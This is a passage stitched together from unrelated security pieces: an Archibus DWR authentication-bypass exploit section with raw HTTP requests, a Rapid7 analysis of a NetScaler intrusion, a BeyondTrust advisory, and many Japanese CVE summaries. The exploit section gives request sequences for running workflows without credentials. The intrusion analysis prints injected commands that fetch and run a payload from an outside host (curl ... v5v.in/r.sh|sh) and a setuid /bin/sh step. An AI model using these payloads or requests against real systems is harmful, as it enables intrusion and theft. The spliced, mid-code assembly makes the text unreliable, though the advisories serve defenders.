workflowRuleInputs, result); return result; } Exploitation For exploitation, the scriptSessionId and PROJECT_ID are required. The DWR API requests are in the following format: POST /archibus/dwr/call/plaincall/single.2.dwr Content-Type: text/plain Cookie: DWRSESSIONID=abc callCount=1 batchId=0 instanceId=0 page=%2F scriptSessionId=abc/def c0-scriptName=<SCRIPT_NAME> c0-methodName=<METHOD_NAME> c0-id=0 c0-param0=string:<PROJECT_ID> The scriptSessionId can be obtained with this DWR request. The JSESSIONID can be obtained by browsing to /archibus/login.axvw : POST /archibus/dwr/call/plaincall/__System.generateId.dwr HTTP/1.1 Content-Type: text/plain Cookie: JSESSIONID=<SESSION_ID> callCount=1 batchId=0 instanceId=0 c0-scriptName=__System c0-methodName=generateId c0-id=0 page=%2Farchibus%2Flogin.axvw scriptSessionId= The Project_ID can be obtained with this request: POST /archibus/dwr/call/plaincall/SecurityService.getProjects.dwr HTTP/1.1 Content-Type: text/plain Cookie: JSESSIONID=<SESSION_ID>; DWRSESSIONID=abc callCount=1 batchId=1 instanceId=0 nextReverseAjaxIndex=0 c0-scriptName=SecurityService c0-methodName=getProjects c0-id=0 page=%2Farchibus%2Flogin.axvw scriptSessionId=abc/def Proof-of-Concept (POC) Example Request To Run Workflow Rule Without Authentication Obtain a scriptSessionId and the Project_ID. These can be obtained easily by sending a login request from the browser and viewing the request. This request to the DWR endpoint specifies two DWR method calls by specifying the callCount parameter as 2. The first method called is the isPasswordUppercase method. Its parameters begin with c0 in the POST body. It sets the user session in the context store with context.setUserSession(coreUserSession) via isPasswordUppercase . The second method called is the runWorkflowRule method which uses the context of the core user session which was set by the isPasswordUppercase method. Its parameters begin with c1. The end result is that any workflow can be run with the core user session without providing any credentials. summary: Overview In early October 2026, Rapid7 analysts investigated a compromise of a Citrix NetScaler ADC appliance. The appliance was running an affected 14.1 build and was exposed to active exploitation targeting NetScaler authentication and SAML deployments. The intrusion achieved root code execution, deployed multiple persistence mechanisms, installed PHP web shells, created outbound command-and-control and internal tunnelling capabilities, performed targeted reconnaissance of DNS, LDAP/Active Directory, management services and VMware vCenter infrastructure, and exfiltrated NetScaler configuration and key material. The activity overlaps with public reporting on the WHIPSHOT/SLAPSHOT NetScaler campaign. However, this case provides additional detail on the operational lifecycle, including repeated post-reboot execution through the crash-handling workflow, HA-aware persistence, a dedicated Go reconnaissance tool, a separate FreeBSD proxy agent, and a staged collection pipeline. Key findings The first confirmed root execution occurred shortly after attacker-controlled text was inserted into a NetScaler authentication username. The injected text caused or immediately preceded repeated nsaaad crashes and a Pitboss reboot. After reboot, the NetScaler call-home crash handler processed the retained attacker-controlled text and executed a payload as root. The attacker installed cookie-authenticated PHP web shells behind CSS-looking Apache aliases. The attacker set /bin/sh to mode 6555, allowing an unprivileged web process to obtain effective root privileges. The implant framework maintained access through cron, rc.netscaler, watchdog loops, an outbound reverse agent, and an HTTP-fronted TCP proxy. HA synchronization and forced failover logic attempted to preserve access across the appliance pair. A Go tool mapped internal routes, DNS, LDAP/AD, management services and VMware vCenter systems. NetScaler configuration, historical configurations, HTTP configuration, diagnostics and system backup material were staged for exfiltration. Technical Analysis Initial access The first event was an authentication request containing attacker-controlled text similar to: pitboss PPE unexpectedly died NSPPE;fetch${IFS}-qo${IFS}/v ...;sh${IFS}/v;# The observed chain was: Figure 1: Sequence diagram showing the attack chain Logs collected show attackers chaining CVE-2026-88771 , the pre-authentication log-poisoning/RCE issue, with CVE-2026-88779 , the separate SAML-parsing crash. A two-vulnerability sequence in which the SAML parsing flaw supplies a crash/reboot condition while the log-poisoning flaw supplies attacker-controlled command text. The evidence demonstrates more than an attempted chain: the injected command, nsaaad crash loop, Pitboss reboot, post-reboot handler activity, and root payload execution are all directly correlated across independent logs and filesystem timestamps. The first implant files were created at the same second as the first logged post-reboot execution, and later stages, web shells, tunnels, reconnaissance tooling and exfiltration were confirmed. Rapid7 also published an ETR on the Netscaler zero days currently exploited in the wild. Repeated post-reboot execution The initial execution was not a one-time event. The appliance recorded repeated Pitboss-initiated reboots and repeated call-home handler executions over several days. The handler re-executed stages from multiple infrastructure addresses and the repeated execution model allowed the operator to refresh persistence, deploy new components and continue collection after appliance restarts. The crash-handling path functioned as a delayed and repeatable execution trampoline, the chaining happened to avoid waiting 24h for the injected payload to run. Payload evolution Two .slap dropper versions were recovered: 17447d.sh (earlier version) SHA-256: a0ba4e1ad622d9c3d950b4156d4430812d05bee216ab22c3804a9f7a80535556 and: 1.sh SHA-256: 6774bfed99da38cec82e721de4bd64a67db7840efadcc71e7df02eb6f0a03c44 The later version added reverse-agent functionality, relay installation, HA recovery, stage tracking, and structured upload logging, indicating operational maturation during the campaign. The nsvmd installer branch was separately identified as: 2.sh / r.sh SHA-256: 56a892d80096a9db4ca473a9c3109729c60a5ba901d6ba65948bdb1f4a6fb186 Persistence and web shells The main framework used a directory under /nsconfig/.slap. /nsconfig/.slap/vc /nsconfig/.slap/vcscan-agent.sh /nsconfig/.slap/agent.pl /nsconfig/.slap/bridge.pl /nsconfig/.slap/boot.sh /nsconfig/.slap/reverse-agent.sh It deployed three web shell copies into the LogonPoint custom web directory: .slap.receiver .ctxs.receiver receiver.deb The shells used a cookie-based command channel. Commands were supplied through a second cookie and returned through an HTTP 404 response body. The 404 response helped the shell blend into normal web traffic and made successful command requests resemble missing resources. The attacker modified Apache configuration to: execute .deb files as PHP; enable PHP execution; map CSS-looking URLs to .slap.receiver; accept randomized hexadecimal CSS suffixes; preserve an attacker backup of the HTTP configuration. The alias created were the following: /logon/LogonPoint/custom/receiver.v2.min.css /logon/LogonPoint/custom/receiver.v2.min.<hex>.css ↓ /var/netscaler/logon/LogonPoint/custom/.slap.receiver TA repeatedly set: chmod 6555 /bin/sh This made the shell setuid and setgid. Because Apache normally runs with reduced privileges, this provided a path for the PHP web shell to obtain effective root privileges. The framework also reseeded cron entries and boot hooks whenever it ran. This made the compromise resilient to reboots, image regeneration and loss of individual cron entries. Tunnelling and command channels The intrusion deployed multiple redundant access paths. Perl TCP session manager agent.pl created a loopback listener on an ephemeral port and recorded it in /tmp/.uxdport It used /tmp/.uxdlock for process coordination and supported operations including: ping open push pull exch close The open operation accepted arbitrary destination hosts and ports, turning the NetScaler into an internal TCP pivot. Python HTTP tunnel The Python components provided a local session manager and HTTP front end: it accepted base64 commands in an HTTP header and returned tunnel responses in HTTP 404 bodies. This behavior overlaps with publicly reported WHIPSHOT/SLAPSHOT tooling. Outbound reverse agent The reverse agent polled an external command endpoint every 15 seconds, executed the received command with /bin/sh -c, and returned output using HTTP PUT. This gave the operator command execution without requiring an inbound connection to the appliance. HA-aware persistence The framework included explicit HA recovery logic: sync HA files all force HA failover The code attempted to synchronize implant files to the HA peer and, when appropriate, force failover so the node containing the implant became active. Internal reconnaissance A stripped, statically linked FreeBSD Go binary was recovered from the .slap directory. The tool was designed to map infrastructure reachable from the compromised appliance. It contains functionality associated with: local interface and route parsing; gateway-prefix discovery; subnet expansion; DNS server and domain discovery; DNS zone-transfer hunting; LDAP anonymous bind and RootDSE queries; LDAP searches; management-service checks; TLS certificate inspection; VMware vCenter classification. A launcher named vcscan-agent.sh downloaded and validated the scanner as scanner-freebsd-amd64, installed it as /nsconfig/.slap/vc, and ran two stages: broad scanning of RFC1918 space and management-focused scanning of ranges derived from DNS and LDAP results. The launcher collected route, DNS, LDAP, management and vCenter results into files such as: vcpersist-<token>_dns_candidates.tsv vcpersist-<token>_dns_ldap_verified.tsv vcpersist-<token>_vcenter_verified_all.txt It then compressed and uploaded the results to the operator infrastructure. This reconnaissance component addition confirms the campaign is active and developing, mapping the identity, management and virtualization infrastructure from a compromised ADC vantage point. nsvmd proxy The second payload branch deployed a FreeBSD Go agent named nsvmd through injection of 2.sh/r.sh under /flash/.nsvm/nsvmd: curl${IFS}-sSLk${IFS}https://v5v.in/r.sh?k=<token>|sh The agent was started with: nsvmd -server v5v.in:443 -sni c.v5v.in The installer created a 45s watchdog (/flash/.nsvm/watchdog.sh), boot persistence through /nsconfig/rc.netscaler, 5 minute and daily cron persistence (/flash/.nsvm/ guard.sh ,/flash/.nsvm/restart.sh) marking nsvmd immutable using chflags uchg. Agent logs were collected under /flash/.nsvm/.agent.log and /flash/.nsvm/.wd.log. Configuration and key-material collection The attacker staged and uploaded: /nsconfig/ ns.conf.0 through ns.conf.4 ns.conf.bak /etc/httpd.conf system backup archives implant diagnostics The configuration archive could contain encrypted credentials, LDAP/RADIUS bind information, administrative configuration, SSL private keys and key-encryption material. The collection logic also uploaded manifests and stage logs and retried failed uploads. A separate archive was staged in the web root and successfully downloaded through an HTTP 200 request. The response size matched the staged archive size, providing direct evidence of configuration exfiltration through the web interface. Intelligence Hub along with ongoing intelligence on the latest campaigns. Defensive recommendations Patch NetScaler appliances to the applicable CVE-2026-88779 and CVE-2026-88771 fixed builds and verify the earlier CTX697096 fixes. Treat Internet-facing appliances as potentially compromised if they were vulnerable during the campaign window. Collect volatile evidence before rebooting or rebuilding when compromise is suspected. Inspect both nodes of every HA pair. Hunt for the .slap, .relay and .nsvm paths. Hunt for setuid /bin/sh, unauthorized Apache PHP handlers and CSS-looking aliases. Search for nsaaad crashes, Pitboss reboots and ns_monuploadd_err.pl execution records. Rotate all credentials and keys exposed through /nsconfig, including LDAP/RADIUS credentials and encryption-related material. Review outbound traffic for the listed infrastructure and internal scanning from NetScaler source addresses. Conclusion This incident demonstrates how a NetScaler compromise can evolve from a pre-authentication injection into a persistent appliance-resident intrusion platform. The attacker combined web shells, setuid privilege persistence, outbound command execution, internal TCP tunnelling, HA manipulation, environment reconnaissance and automated configuration exfiltration. The most significant new findings are the observed chaining of CVE-2026-88779 and CVE-2026-88771 and the dedicated reconnaissance workflow. Rather than using the ADC only as a foothold, the operator used it as a privileged vantage point to map internal networks, identity services, management infrastructure and virtualization systems. This provides defenders with additional high-value hunting opportunities and shows why patching alone is insufficient after an Internet-facing NetScaler has been exposed to active exploitation. summary: Overview On October 15, 2026, BeyondTrust disclosed a critical authentication bypass in Remote Support (RS) , its platform for remotely troubleshooting and administering endpoints. Tracked as CVE-2026-102764 and assigned a CVSSv4 score of 9.3 , the vulnerability allows unauthenticated remote attackers to perform file operations on an affected appliance without user interaction. Versions 26.2.3 and earlier are affected unless the BT26-05-RS patch has been applied. BeyondTrust has confirmed that exploitation in the wild has already occurred prior to disclosure. Its October 16 report dates the two known Remote Support compromises to August 29, 2026: one BeyondTrust-hosted instance and one self-hosted appliance. BeyondTrust discovered and contained the hosted compromise on September 28; Mandiant shared corroborating findings from the self-hosted investigation on September 30. On October 16, 2026, CVE-2026-102764 was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV), based on evidence of active exploitation. CISA's official KEV feed lists an October 19, 2026 due date and marks forensic triage as required. Rapid7 recommends remediating affected appliances on an emergency basis and investigating RS appliances for prior compromise. BeyondTrust's remote access products have previously been targeted earlier this year. Rapid7 covered CVE-2026-1731 , which was added to KEV in February 2026. Technical overview According to the vendor's CVE record, internal Remote Support components inadequately validate the origin of incoming messages, permitting file operations on the appliance. The flaw is classified as authentication bypass by spoofing ( CWE-290 ). BeyondTrust is withholding exploitation details while customers apply patches. Mandiant's investigation describes arbitrary file uploads, deployment of the SAWFLY PHP web shell and BARECLAW tunneler, root escalation, attempted credential-vault extraction, persistence, and log deletion. Mandiant attributes the activity to ARMORY CASTLE, a suspected PRC-nexus espionage actor formerly tracked as UNC5221. On October 30, 2026, Rapid Intelligence published a technical analysis demonstrating unauthenticated file upload leading to remote code execution as the site user. A Metasploit exploit module is also available. Mitigation guidance A vendor-provided patch is available. Rapid7 strongly recommends that organizations running affected self-hosted Remote Support appliances apply it on an emergency basis, outside of normal patching cycles. Per BeyondTrust's advisory : Affected versions: Remote Support 26.2.3 and earlier, unless the patch has been applied. Remediation: Apply the BT26-05-RS patch, available for versions 24.3.1 through to 26.2.3 . Older deployments: Instances older than 24.3.1 require an upgrade to a patch-supported version followed by application of the patch. Self-hosted deployments: Confirm installation through the /appliance interface. Apply the patch manually if automatic updates are not enabled. SaaS deployments: BeyondTrust states that all Remote Support SaaS customers were patched as of October 9, 2026. Note: BeyondTrust also recommends immediate patching of self-hosted Privileged Remote Access (PRA) because it shares the affected code. The vendor has not identified a way to exploit this vulnerability in PRA. PRA customers should confirm the appropriate patch with BeyondTrust Support. Rapid7 strongly recommends investigating for compromise even after patching. Mandiant recommends preserving evidence before changes or reboots, isolating suspected appliances, and rebuilding from a clean, fully patched image if compromise is confirmed or cannot be ruled out. Organizations should rotate stored or brokered credentials after patching or rebuilding, and review administrative changes and downstream sessions. Credential and configuration reviews also apply to SaaS customers. Patching does not remove persistence. For the latest mitigation guidance, please refer to the vendor's security advisory . Artifacts, evidence sources, and IOCs BeyondTrust recommends hunting for the following behaviors: Unrecognized administrative sessions from residential broadband or commercial VPN addresses. Unexpected scripts in web directories or shells spawned by web service accounts. Unauthorized account, permission, or session-policy changes, particularly to Jump Items or Teams. Gaps in log forwarding bounded by a single session. The vendor cautions that infrastructure and tooling vary between victims; an absence of known indicators does not establish that an appliance is uncompromised. BeyondTrust customers can request an additional hunting package through its trust portal . Organizations should forward appliance events to an external SIEM using BeyondTrust's syslog guidance and preserve existing external logs. Enabling forwarding now cannot recover previously deleted evidence. Mandiant identified evidence in access, syslog, messages, thin-scc, brain, and SSL logs. Customers should coordinate host-level log and artifact inspection with BeyondTrust Support; they cannot audit the appliance host filesystem. Mandiant's report includes the file indicators below and separate YARA rules: Filename Description SHA-256 mangoapi.php SAWFLY web shell dc14e215269a93fdbc4c1a80b984c23faf7af0911c6dbb85309796a6f2ae95fb ingredi_ws BARECLAW tunneler 1f19b9a27d79c11bda00a1e8faf74a7fdd683d38ccef1b60df2fd0307e3aa462 Additional artifacts include /usr/bin/dbus-authd , /home/bomgar/sbin/post_boot.d/zz-root-persist , and an unauthorized /uidchanarge route in /ns/config/haproxy.conf . Rapid7 customers Exposure Command, Vulnerability Management, and Nexpose Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-102764 with an authenticated vulnerability check expected to be available in the October 20 content release. Updates October 19, 2026 : Initial publication. November 2, 2026 : Added references to the Rapid7 technical analysis and Metasploit exploit module.

summary: Backstageは開発者向けポータルを構築するためのオープンフレームワークです。バージョン0.3.25より前の@backstage/plugin-scaffolder-backend-module-confluence-to-markdownパッケージには、ConfluenceからMarkdownへのスキャフォルダーモジュールにおいて不適切な入力検証の脆弱性があります。ConfluenceからMarkdownへのスキャフォルダーモジュールの入力検証が不十分であるため、攻撃者がテンプレート実行中のファイル書き込み操作に影響を与える可能性があります。この脆弱性を悪用するには、Backstageユーザーが攻撃者に操作されたConfluenceコンテンツを処理するテンプレートを実行しなければなりません。この問題はバージョン0.3.25で修正されています。

summary: Backstageは、開発者ポータルを構築するためのオープンフレームワークです。バージョン0.3.25以前の@backstage/plugin-scaffolder-backend-module-confluence-to-markdownパッケージには、不適切なリポジトリパス検証の脆弱性が存在していました。この脆弱性はスキャフォルダーバックエンドモジュールに影響を及ぼします。認証されたユーザーが対象のテンプレートを実行し、そのリポジトリファイルの場所を制御できる場合、生成されたコンテンツがタスクの作業スペース外の、Backstageバックエンドプロセスが書き込み可能な場所に書き込まれる可能性があります。この問題はバージョン0.3.25で修正されています。

summary: Backstageは開発者向けポータルを構築するためのオープンフレームワークです。バージョン0.21.9以前の@backstage/plugin-kubernetes-backendパッケージには、Kubernetesリソースクエリにおける機密情報の漏洩の脆弱性があります。標準的なKubernetesリソースの読み取り権限を持つ認証済みユーザーは、Kubernetesプラグインによってマスクされるよう設計されている機密値を取得できる可能性があり、接続されたクラスタ内に保持されている資格情報やその他の機密情報が露呈する恐れがあります。漏洩の範囲は、Backstageのサービスアカウントが読み取り許可を持ち、かつ対象となるカタログエンティティのネームスペースおよびラベルセレクターに一致するリソースに限定されます。クラスタの認証情報がこれらのリソースへの読み取りアクセスを付与していないデプロイメントは影響を受けません。この問題はバージョン0.21.9で修正されています。

title: Linux Foundationのbackstage/plugin-kubernetes-backend等の複数製品における複数の脆弱性

summary: Backstageは、開発者ポータルを構築するためのオープンフレームワークです。@backstage/plugin-search-backendのバージョン2.1.6未満および@backstage/plugin-search-backend-module-elasticsearchのバージョン1.8.7未満では、検索エンジンの権限フィルタリングがポリシーで拒否されたドキュメントを返してしまう可能性がありました。認証されたBackstageユーザーが検索ドキュメントタイプに対してDENYポリシーの対象となっている場合に、permission.enabledがtrueに設定されている環境で、ElasticsearchまたはOpenSearchバックエンドを使用すると、不正な結果を受け取る事態が発生していました。この問題は、@backstage/plugin-search-backend 2.1.6および@backstage/plugin-search-backend-module-elasticsearch 1.8.7で修正されています。

summary: Apache CXFのJAX-RS XMLセキュリティモジュールには、暗号署名の不適切な検証に関する脆弱性があります。JAX-RS XML署名インターセプター（XmlSigInHandler、XmlSigInInterceptor、およびストリーミングのXmlSecInInterceptor）は、アプリケーションに渡されるXMLが署名で保護されていることを適切に保証していませんでした。攻撃者は信頼されたキーで署名された任意のドキュメントを取得し、それを署名されていないコンテンツで包むことができ、その結果アプリケーションは当該コンテンツを署名済みと誤認識してしまいます。ユーザーには、この問題を修正したバージョン4.2.4、4.1.9、または3.6.13にアップグレードすることを推奨します。

summary: Doclingは、多様なフォーマットを解析し、生成AIエコシステムとの統合を提供することで、ドキュメント処理を簡素化します。バージョン2.107.0から2.120.3までの間、docling/backend/opendocument_backend.pyは、参照された部分がドキュメントアーカイブ内に存在しない場合に、draw:image要素のxlink:href属性値をファイルシステムパスとして使用していました。_image_ref_from_odf_image関数は、スキームチェックや抽出ディレクトリの制限、他のバックエンドで使用されるenable_local_fetch設定なしに、その攻撃者が制御可能なパスを読み込んでいました。Pillowが画像としてデコードできる読み取り可能なファイルは変換後の出力に埋め込まれ、他の既存パスは読み取り試行により区別されていました。この問題はバージョン2.120.3で修正されました。

summary: vLLMは大規模言語モデルの推論およびサービングエンジンです。バージョン0.30.0以前では、Rustフロントエンドのtrack_http_metricsミドルウェアが、登録されたルートに到達するリクエストの生のHTTPメソッドトークンをPrometheusのラベルとして記録していました。認証されていない攻撃者が/tokenizeのような保護されていないルートに任意のユニークなメソッドトークンを送信すると、PrometheusのFamily::get_or_create関数がカウンターおよびヒストグラムのラベルセットを恒久的に作成し続けます。これらのラベルセットによってプロセスのメモリ使用量が増加し、/metricsレスポンスが肥大化してサービスまたは監視経路が枯渇する可能性があります。この問題はバージョン0.30.0で修正されています。

summary: Apache CXFにおいて、multipart/MTOMの添付パートヘッダーのパーサーは、設定されたattachment-max-header-size（デフォルト300文字）およびattachment-headers-max-count（デフォルト500）の制限を完全には適用していませんでした。サイズ制限は各物理行にのみ適用されており、継続行から構築されたヘッダー値や繰り返されるヘッダーの結合値には適用されていませんでした。カウント制限は異なるヘッダー名の数に対してのみチェックされており、ヘッダー行の総数にはチェックされていませんでした。リモートの認証されていない攻撃者が非常に大きな折りたたまれたまたは繰り返されるパートヘッダーを含むmultipartリクエストを送信することが可能であり、これによりサーバーは無制限にメモリを割り当ててサービス拒否（DoS）を引き起こす可能性があります。ユーザーは本問題を修正したバージョン4.2.4、4.1.9、または3.6.13にアップグレードすることを推奨します。

summary: Apache CXFにおいて、NettyベースのHTTPクライアントトランスポート（cxf-rt-transports-http-netty-client）は、サーバーのTLS証明書に記載されたホスト名が呼び出し先のホストと一致しているかを検証していませんでした。これはHTTP/1.1およびHTTP/2の両方に該当し、disableCNCheckがデフォルト値のfalseのままでも同様でした。証明書チェーンは設定された信頼ストアに対して検証されていましたが、エンドポイントの正当性は検証されていませんでした。通信を傍受できる攻撃者は、クライアントが信頼する任意の証明書（攻撃者が管理するドメインに対して公開発行された証明書など）を提示して、ターゲットサービスをなりすますことが可能でした。これにより、認証情報を含むメッセージのやり取りを読み取ったり改ざんしたりすることができました。ユーザーには、この問題が修正されたバージョン4.2.4、4.1.9、または3.6.13へアップグレードすることを推奨します。

summary: デフォルトでは、StaxUtils は XML ドキュメント内の要素の総数や文字の総数に制限を設けていませんでした。そのため、非常に大きなリクエストは、特に CXF が入力から DOM を構築する場合（例：SAAJ や WS-Security）において、パース中に多くのメモリと CPU を消費し、リクエストサイズ制限が設定されていないとサービス拒否（DoS）を引き起こす可能性がありました。現在、両方の制限にはデフォルト値が設定されています。最大要素数は 100 × maxChildElements（デフォルトで 5,000,000）であり、最大ドキュメントサイズは 256M 文字です。より大きなドキュメントを処理するアプリケーションは、org.apache.cxf.stax.maxElementCount および org.apache.cxf.stax.maxXMLCharacters プロパティでこれらの制限を引き上げることができます。ユーザーには、この問題を修正したバージョン 4.2.4、4.1.9、もしくは 3.6.13 へアップグレードすることを推奨します。

summary: Foremanに脆弱性が発見されました。foreman-tailユーティリティは、evalコマンドを安全でない方法で使用しているため、OSコマンドインジェクションの脆弱性があります。このスクリプトはユーザーから渡された引数を受け取り、それらを直接文字列に組み込んだ後、evalで実行してファイルパスを展開します。入力がサニタイズもしくは引用されていないため、ローカルの攻撃者がシェルのメタ文字（例: ;, &, |）を注入し、任意のシステムコマンドを実行できる状態です。

summary: FreePBXはオープンソースのIP PBXです。バージョン16.0.4および17.0.6以前のFreePBX Music on Hold（MoH）モジュールには重大なセキュリティ欠陥が存在し、認証済みの攻撃者がAsteriskサービスの権限で任意のシステムコマンドを実行できてしまいます。既存のFreePBX管理者アカウントによる認証が必要です。根本的な原因は、このモジュールがカスタムAsteriskアプリケーションを定義するPOSTパラメータを受け入れ、そのデータをサニタイズせずにデータベースに保存することにあります。後に、このデータは検証されることなく直接musiconhold_additional.conf設定ファイルに書き込まれます。Asteriskはこの設定ファイルを読み込み、指定されたアプリケーションを実行するため、攻撃者は任意のコマンドを注入でき、それがAsteriskの権限で実行されてしまいます。この問題はバージョン16.0.4および17.0.6で修正されています。

summary: FreePBXはオープンソースのIP PBXです。バージョン16.0.39および17.0.7より前のバージョンでは、ユーザーコントロールパネル（UCP）を経由して認証されたユーザーが、特殊に細工されたHTTP文字列を使用することでPBX上でwebサーバーユーザー（通常はasterisk）として任意のコマンドを実行することが可能でした。UCPへの認証済みアクセスが必要です。なお、管理者コントロールパネル（ACP）アクセス（通常はFreePBXの高レベル管理者アカウントのみ）に比べて、特権の低いユーザーがUCPアクセスを持つことの方が一般的であることが多い点に注意してください。UCPで使用される特定のURLパラメータの不十分なサニタイズにより、これらのフィールド内の悪意ある文字列を完全に排除できていませんでした。これにより、コマンドを巧妙に連結することでホストサーバー上でバイナリが実行される可能性がありました。この問題はバージョン16.0.39および17.0.7で修正されています。

summary: FreePBXはオープンソースのIP PBXです。バージョン16.0.10および17.0.5以前には、サウンド言語のアップロードおよび変換機能に重大な脆弱性が存在し、認証済みの攻撃者が任意のファイル書き込みを実行できるため、リモートコード実行（RCE）につながる可能性があります。既知のユーザー名による認証が必要です。この脆弱性は、ファイル変換処理におけるパスの不十分なサニタイズに起因しており、パストラバーサル攻撃を可能にして悪意のあるPHPファイルをウェブサーバーのルートディレクトリに配置されてしまう問題です。この問題はバージョン16.0.10および17.0.5で修正されています。

summary: FreePBXはオープンソースのIP PBXです。バージョン16.0.40および17.0.7より前のバージョンには、superfectaモジュールに重大なリモートコード実行（RCE）脆弱性が存在しています。この脆弱性は、任意のPHPファイルを安全でない方法でインクルードしてしまうため、認証済みの攻撃者がウェブサーバーユーザーの権限でサーバー上の任意のPHPコードを実行できるものです。既知のユーザー名での認証が必要です。この脆弱性はSuperfectaモジュールのAJAXハンドラーにあるoptionsおよびsave_optionsケースに起因しています。コードはユーザーから提供された入力に基づき、sources/ディレクトリからPHPファイルを動的にインクルードします。これにより、任意のディレクトリ作成（例：backupモジュール経由）およびファイルアップロードによってパスが露呈する場合（例：soundlangモジュール経由）と組み合わせることで、攻撃者が任意のコードを実行できるようになります。この問題はバージョン16.0.40および17.0.7で修正されています。

summary: RabbitMQはメッセージングおよびストリーミングブローカーです。バージョン3.13.0から3.13.18まで、および4.0.23、4.1.14、4.2.9、4.3.3において、TLSピア証明書のDNを介したストアドXSSの脆弱性（ストリーム管理UIに存在し、V-11の兄弟脆弱性です）が報告されています。コードの102、106、110行目で、peercertsubjectおよびpeercertissuerが生の＜%= %＞でレンダリングされており、fmtstring()によるサニタイズがされていません。RFC4514のバックスラッシュエスケープはHTMLへの影響がなく、回避可能（例：＜img ... //＞ のようなケース）です。非デフォルト設定として、verifypeerが設定されたストリームのTLSリスナーが必要であり、攻撃者は取得可能な信頼された証明書を悪意のあるDNで用いて攻撃を行います。connection.ejsの脆弱性と同様に、rabbitmqstreamとrabbitmqstreammanagementが有効で、verifypeerを使用するTLSリスナー環境において、攻撃者はリスナーが信頼するCAにより署名された、攻撃者が選択したDNを持つ証明書を取得できます。その結果、オペレーターがストリーム接続の詳細を閲覧すると問題が発生します。この脆弱性はバージョン3.13.18、4.0.23、4.1.14、4.2.9、および4.3.3で修正されています。

summary: RabbitMQはメッセージングおよびストリーミングブローカーです。バージョン4.2.0から4.2.9および4.3.3までの間で、OAuth2の isinteger(Exp) ガードが浮動小数点のexpに対するトークンの有効期限チェックをスキップする問題があります。validatetokenexpiry/1（208〜214行）および expirytimestamp/1（138〜144行）の両方は 'when isinteger(Exp)' でガードしており、浮動小数点値の場合は ok/never にフォールスルーします。josejwt:verifyは署名のみを検証し、expの検証は行いません。浮動小数点のexpの場合、有効期限チェックがどこでも行われません。IdPがexpをJSONの浮動小数点として発行した場合（RFC 7519は分数のNumericDateを許可しています）、ログイン時の有効期限チェックと接続中の切断タイマーの両方が静かにスキップされ、既に期限切れのトークンを受け入れてしまい、接続が決してタイムアウトしません。OAuth2バックエンドで有効なIdPが浮動小数点のexpを発行する場合（まれであり、主流のIdPは整数を発行します）、攻撃者は以前に有効だった署名済みトークンを保持している可能性があります。この問題はバージョン4.2.9および4.3.3で修正されています。

summary: RabbitMQはメッセージングおよびストリーミングブローカーです。バージョン4.0.0から4.3.3、4.2.9、4.1.14、および4.0.23までの間において、Shovelはクラッシュレポーターによって記録された状態をフォーマットせず、クラッシュダンプファイルに暗号化されていない資格情報が残ってしまう可能性があります。Shovelワーカーのgenserverプロセスはformat_status/2コールバックを実装していません。これらのプロセスがクラッシュすると（例：ネットワークパーティションや接続障害の場合）、OTP SASLエラーハンドラーは平文のAMQPパスワードやURIを含む完全なプロセス状態をエラーログに書き込みます。これは特にShovelワーカーにとって深刻な問題であり、プロセス全体のgenserver状態に復号化された平文のURI（amqp://user:password@hostの形式を含む）を保持しているためです。Shovelワーカーのクラッシュ（ネットワークパーティション時に一般的に発生します）は平文のアップストリームおよびダウンストリームのパスワードを自動的にエラーログに書き込むため、資格情報の漏洩が自動的に発生します。特別な設定は不要であり、DEBUGログとは異なり、SASLエラーレポートは常に有効な状態です。この問題はバージョン4.3.3、4.2.9、4.1.14、および4.0.23で修正されています。

summary: RabbitMQはメッセージングおよびストリーミングのブローカーです。バージョン4.0.0から4.3.3、4.2.9、4.1.14、および4.0.23の範囲において、CVE-2026-44838の不完全な修正が含まれています。escaperegexchar/1はハイフンをエスケープしないため、MQTTトピックの権限回避の可能性があります。CVE-2026-44838の修正により、expandtopicpermission/2は展開されたトピック権限変数（escaperegex(V)）の正規表現メタ文字をエスケープするようになりましたが、escaperegexchar/1はバックスラッシュ、^、$、.、|、?、+、(、)、[、]、{、}をエスケープし、ハイフンは省略します。トピック権限テンプレートが{clientid}を[...]文字クラス内に配置した場合、低権限の認証済みMQTTユーザーが自分のclientidを制御していると、テンプレート内で{clientid}を[...]に埋め込むことによってトピックの認可（読み取りおよび書き込み）範囲を拡大できる可能性があります。この問題はバージョン4.3.3、4.2.9、4.1.14、および4.0.23で修正されています。

summary: FreePBXはオープンソースのIP PBXです。バージョン17.0.9以前では、FreePBXのGraphQL APIモジュールインターフェースへのアクセス権を持つ認証済みユーザーが任意のシェルコマンドを実行可能です。APIモジュールへの認証済みアクセスが必要です。PBX APIモジュールのドキュメントジェネレーターは認証済みのhostパラメータを受け取り、それを使ってシェルコマンドを生成します。コードの経路は実行前に生成されたOAuthアクセストークンを検証しますが、hostパラメータの検証やエスケープは行いません。この脆弱性により、通常はasteriskユーザーとしてFreePBXのWeb/PBXサービスユーザー権限で任意のシェルコマンドを認証済みで実行できます。本問題はバージョン17.0.9で修正されています。

summary: PJSIPはC言語で書かれた無料かつオープンソースのマルチメディア通信ライブラリです。バージョン2.17およびそれ以前では、pjmedia/src/pjmedia/avi_player.cにあるPJSIPのAVIパーサーが、入力ファイルのビデオチャンク長を宣言されたメディアの寸法から導出されたフレームバッファの容量にコピーするバイト数として扱っています。そのため、細工されたAVIファイルによって、アプリケーションがファイルを再生したりフレームを取得したりする際に、攻撃者が制御可能な形でヒープ割り当ての範囲外への書き込みが引き起こされる可能性があります。既存のサイズのアサーションは、アサーションが無効化されている製品版ビルドでは保護機能として機能しません。典型的なローカル再生ではプロセスがクラッシュする可能性があり、信頼されていないAVIソースを受け入れるアプリケーションでは、より深刻なメモリ破損状態を引き起こす恐れがあります。本レビュー時点では修正済みのバージョンはまだ提供されていません。

summary: ImageMagick 7.1.2-31 および 6.9.13-56 より前のバージョンには、PCD（およびアップストリームのアドバイザリによると CUBE と HALD）コーダーにポリシーバイパスの脆弱性が含まれています。特定のコマンドラインオプションが指定された場合、デコーダーは設定されたリソース制限を確認しません。そのため、追加のメモリ割り当てが発生する可能性があります。したがって、ImageMagick にコマンドラインオプションを渡せるローカルユーザーは、意図されたメモリポリシーの制限を超過でき、その結果、限定的な可用性に影響を及ぼす可能性があります。この問題は 7.1.2-31 および 6.9.13-56 で修正されています。

